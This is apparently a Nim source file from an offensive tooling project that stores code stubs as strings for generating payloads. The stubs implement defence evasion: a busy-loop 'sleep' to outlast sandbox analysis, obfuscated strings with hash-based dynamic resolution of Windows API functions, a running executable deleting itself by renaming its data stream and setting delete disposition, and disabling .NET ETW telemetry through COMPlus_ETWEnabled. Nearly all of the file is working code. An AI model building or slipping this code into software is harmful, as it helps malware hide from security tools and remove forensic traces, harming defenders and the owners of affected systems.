import strformat


let SleepStubFirst * = fmt"""
# Credit to @WhyDee86 - https://twitter.com/WhyDee86 for this sleep implementation

import random
import times

type Node = ref object
  x, y: int32
  left, right: Node

template newNode(value: int32): Node =
  Node(x: value, y: rand(high int32).int32)

proc merge(lower, greater: Node, res: var Node) =
  if lower.isNil:
    res = greater
  elif greater.isNil:
    res = lower
  elif lower.y < greater.y:
    res = lower
    merge(lower.right, greater, lower.right)
  else:
    res = greater
    merge(lower, greater.left, greater.left)

template merge(lower, equal, greater: Node, res: var Node) =
  merge(lower, equal, res)
  merge(res, greater, res)

proc splitBinary(orig: Node, lower, equalGreater: var Node, value: int32) =
  if orig.isNil:
    lower = nil
    equalGreater = nil
  elif orig.x < value:
    lower = orig
    splitBinary(lower.right, lower.right, equalGreater, value)
  else:
    equalGreater = orig
    splitBinary(equalGreater.left, lower, equalGreater.left, value)

template split(orig: Node, value: int32, lower, equal, greater: var Node) =
  var equalGreater: Node
  splitBinary(orig, lower, equalGreater, value)
  splitBinary(equalGreater, equal, greater, value + 1)

type Tree = object
  root: Node

template hasValue(self: var Tree, x: int32): bool =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  let ret = not equal.isNil
  merge(lower, equal, greater, self.root)
  ret

template insert(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  if equal.isNil:
    equal = newNode(x)
  merge(lower, equal, greater, self.root)

template erase(self: var Tree, x: int32) =
  var lower, equal, greater: Node
  split(self.root, x, lower, equal, greater)
  merge(lower, greater, self.root)

proc Calc * () =
  randomize()
  var
    tree = Tree()
    cur = 5'i32
    res = 0'i32
#2500000 = 12-14sec
  for i in 1'i64 ..< 500000'i64:
    #echo i
    let a = i mod 3
    cur = (cur * 57 + 43) mod 10007
    case a:
    of 0:
      tree.insert(cur)
    of 1:
      tree.erase(cur)
    of 2:
      if tree.hasValue(cur):
        res += 1
    else:
      discard

  #echo res

proc HowMuchTimeWouldYoulikeToSleep * (sec : int) = 
  var interval = 0
  let t0 = getTime()
  Calc()
  #echo "First run Done"
  var delta = getTime() - t0
  while delta.inSeconds() < sec:
      interval += 1
      #echo "Round: ",interval
      #echo delta.inSeconds()," Seconds out of: " , sec
      Calc()
      delta = getTime() - t0
  #echo delta.inSeconds()," Seconds"
"""

let DInvokeSelfDeleteStubs * = """

const
  SHLWAPI_DLL* = obf("shlwapi.dll")

type
  CreateFileW_t* = proc (lpFileName: LPCWSTR, dwDesiredAccess: DWORD, dwShareMode: DWORD, lpSecurityAttributes: LPSECURITY_ATTRIBUTES, dwCreationDisposition: DWORD, dwFlagsAndAttributes: DWORD, hTemplateFile: HANDLE): HANDLE {.stdcall.}
  SetFileInformationByHandle_t* = proc (hFile: HANDLE, FileInformationClass: FILE_INFO_BY_HANDLE_CLASS, lpFileInformation: LPVOID, dwBufferSize: DWORD): WINBOOL {.stdcall.}
  GetModuleFileNameW_t* = proc (hModule: HMODULE, lpFilename: LPWSTR, nSize: DWORD): DWORD {.stdcall.}
  CloseHandle_t* = proc (hObject: HANDLE): WINBOOL {.stdcall.}
  PathFileExistsW_t* = proc (pszPath: LPCWSTR): WINBOOL {.stdcall.}

const
  CreateFileW_HASH * = obf("CreateFileW")
  SetFileInformationByHandle_HASH * = obf("SetFileInformationByHandle")
  GetModuleFileNameW_HASH * = obf("GetModuleFileNameW")
  CloseHandle_HASH * = obf("CloseHandle")
  PathFileExistsW_HASH * = obf("PathFileExistsW")

var MyCreateFileW*: CreateFileW_t
var MySetFileInformationByHandle*: SetFileInformationByHandle_t
var MyGetModuleFileNameW*: GetModuleFileNameW_t
var MyCloseHandle*: CloseHandle_t
var MyPathFileExistsW*: PathFileExistsW_t


# temporary workaround, as the ordinal changes between OS Versions and the relative address via DInvoke is wrong.
var shlwapi = MyLoadLibraryA(obf("shlwapi.dll"))
if (shlwapi == 0):
    echo obf("[X] Failed to load shlwapi.dll")

var pathfileExistsAddress = MyGetProcAddress(shlwapi,obf("PathFileExistsW"))
if isNil(pathfileExistsAddress):
    echo obf("[X] Failed to get the address of 'PathFileExistsW'")


MyCreateFileW = cast[CreateFileW_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CreateFileW_HASH, 0, FALSE)))

MySetFileInformationByHandle = cast[SetFileInformationByHandle_t](cast[LPVOID](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), SetFileInformationByHandle_HASH, 0, FALSE)))

MyGetModuleFileNameW = cast[GetModuleFileNameW_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), GetModuleFileNameW_HASH, 0, FALSE))

MyCloseHandle = cast[CloseHandle_t](get_function_address(cast[HMODULE](get_library_address(KERNEL32_DLL, TRUE)), CloseHandle_HASH, 0, FALSE))

# Works but potentially the ordinal could change later on - this lead to bugs
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), "", 669, FALSE))
# Doesn't work, as the relative address is not correct. All those Ordinal functions are ignored maybe? Have to troubleshoot
#MyPathFileExistsW = cast[PathFileExistsW_t](get_function_address(cast[HMODULE](get_library_address(SHLWAPI_DLL, TRUE)), PathFileExistsW_HASH, 0, FALSE))
MyPathFileExistsW = cast[PathFileExistsW_t](pathfileExistsAddress)
"""

let FileDeleteStub * = """

#[
    Author: Marcello Salvati, Twitter: @byt3bl33d3r, slight modifications by @ShitSecure
    License: BSD 3-Clause
    Credit to @jonasLyk for the discovery of this method and LloydLabs for the initial C PoC code.
    References:
        - https://github.com/LloydLabs/delete-self-poc
        - https://twitter.com/jonasLyk/status/1350401461985955840
]# 

# Don't want to import the everything from winim, only what's really needed
from winim import PWCHAR,HANDLE,DELETE,NULL,OPEN_EXISTING,FILE_ATTRIBUTE_NORMAL,WINBOOL,FILE_RENAME_INFO,LPWSTR,DWORD,fileRenameInfo,FILE_DISPOSITION_INFO,TRUE
from winim import fileDispositionInfo,MAX_PATH,WCHAR,INVALID_HANDLE_VALUE

template RtlSecureZeroMemory*(Destination: PVOID, Length: SIZE_T) = zeroMem(Destination, Length)
template RtlCopyMemory*(Destination: PVOID, Source: PVOID, Length: SIZE_T) = copyMem(Destination, Source, Length)

var DS_STREAM_RENAME = newWideCString(obf(":thiswontexist"))

proc ds_open_handle(pwPath: PWCHAR): HANDLE =
    return MyCreateFileW(pwPath, DELETE, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0)

proc ds_rename_handle(hHandle: HANDLE): WINBOOL =
    var fRename: FILE_RENAME_INFO
    RtlSecureZeroMemory(addr fRename, sizeof(fRename))

    var lpwStream: LPWSTR = cast[LPWSTR](DS_STREAM_RENAME)
    fRename.FileNameLength = sizeof(lpwStream).DWORD
    RtlCopyMemory(addr fRename.FileName, lpwStream, sizeof(lpwStream))

    return MySetFileInformationByHandle(hHandle, fileRenameInfo, addr fRename, sizeof(fRename) + sizeof(lpwStream))

proc ds_deposite_handle(hHandle: HANDLE): WINBOOL =
    var fDelete: FILE_DISPOSITION_INFO
    RtlSecureZeroMemory(addr fDelete, sizeof(fDelete))

    fDelete.DeleteFile = TRUE

    return MySetFileInformationByHandle(hHandle, fileDispositionInfo, addr fDelete, sizeof(fDelete).cint)

when isMainModule:
    var
        wcPath: array[MAX_PATH + 1, WCHAR]
        hCurrent: HANDLE

    RtlSecureZeroMemory(addr wcPath[0], sizeof(wcPath))

    if MyGetModuleFileNameW(0, addr wcPath[0], MAX_PATH) == 0:
        echo obf("[-] Failed to get the current module handle")
        quit(QuitFailure)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo obf("[-] Failed to acquire handle to current running process")
        quit(QuitFailure)

    echo obf("[*] Attempting to rename file name")
    if not ds_rename_handle(hCurrent).bool:
        echo obf("[-] Failed to rename to stream")
        quit(QuitFailure)

    echo obf("[*] Successfully renamed file primary :$DATA ADS to specified stream, closing initial handle")
    discard MyCloseHandle(hCurrent)

    hCurrent = ds_open_handle(addr wcPath[0])
    if hCurrent == INVALID_HANDLE_VALUE:
        echo obf("[-] Failed to reopen current module")
        quit(QuitFailure)

    if not ds_deposite_handle(hCurrent).bool:
        echo obf("[-] Failed to set delete deposition")
        quit(QuitFailure)

    echo obf("[*] Closing handle to trigger deletion deposition")
    discard MyCloseHandle(hCurrent)

    if not MyPathFileExistsW(addr wcPath[0]).bool:
        echo obf("[*] File deleted successfully")

"""



let ETWCOMVARStub * = """
proc BlockETW(): bool =
    # Disable ETW via https://blog.xpnsec.com/hiding-your-dotnet-complus-etwenabled/
    var cometw: string = obf("COMPlus_ETWEnabled")
    var setnull: string = "0"
    putenv(cometw, setnull)
    return true

when isMainModule:
    var success = BlockETW()
    echo obf("[*] ETW blocked by COMPLUS_ETWEnabled variable: ") & fmt"{bool(success)}"
"""